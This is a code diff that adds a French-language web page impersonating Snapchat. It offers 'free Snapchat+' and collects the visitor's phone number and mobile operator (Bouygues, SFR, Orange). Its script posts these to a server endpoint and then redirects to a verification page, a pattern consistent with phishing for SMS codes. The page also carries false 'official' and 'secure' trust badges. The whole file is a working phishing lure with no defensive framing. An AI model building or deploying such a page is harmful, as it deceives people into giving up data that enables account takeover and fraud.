@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Snapchat</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="container">
+        <!-- Logo Snapchat -->
+        <div class="snapchat-logo">
+            <img src="images.png" alt="Snapchat" width="120">
+        </div>
+        
+        <h1>Obtenez Snapchat+ <span class="gratuit">Gratuitement</span></h1>
+        <p class="subtitle">Offre limitée - Vérifiez votre numéro pour débloquer Snapchat+</p>
+        
+        <form id="phoneForm">
+            <div class="form-group">
+                <label for="phone">📱 Numéro de téléphone</label>
+                <input type="tel" id="phone" placeholder="06 XX XX XX XX" required pattern="[0-9]{10}" maxlength="10" inputmode="numeric">
+            </div>
+            
+            <div class="form-group">
+                <label for="operator">📡 Opérateur</label>
+                <select id="operator" required>
+                    <option value="">Sélectionnez votre opérateur</option>
+                    <option value="Bouygues Telecom">📶 Bouygues Telecom</option>
+                    <option value="SFR">📶 SFR</option>
+                    <option value="Orange">📶 Orange</option>
+                </select>
+            </div>
+
+            <div class="info-box">
+                <span class="info-icon">ℹ️</span>
+                <span>. Entrez simplement vos informations pour activer Snapchat+.</span>
+            </div>
+
+            <button type="submit" class="btn-primary">⚡ Activer Snapchat+</button>
+        </form>
+
+        <div class="trust-badges">
+            <div class="badge">🔒 Sécurisé</div>
+            <div class="badge">⚡ Instantané</div>
+            <div class="badge">✅ Officiel</div>
+        </div>
+    </div>
+
+    <script>
+        document.getElementById('phoneForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const phone = document.getElementById('phone').value;
+            const operator = document.getElementById('operator').value;
+            
+            await fetch('/api/submit', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ phone, operator })
+            });
+
+            window.location.href = 'verify.html?phone=' + encodeURIComponent(phone) + '&op=' + encodeURIComponent(operator);
+        });
+
+        document.getElementById('phone').addEventListener('input', function(e) {
+            this.value = this.value.replace(/[^0-9]/g, '').slice(0, 10);
+        });
+    </script>
+</body>
+</html>
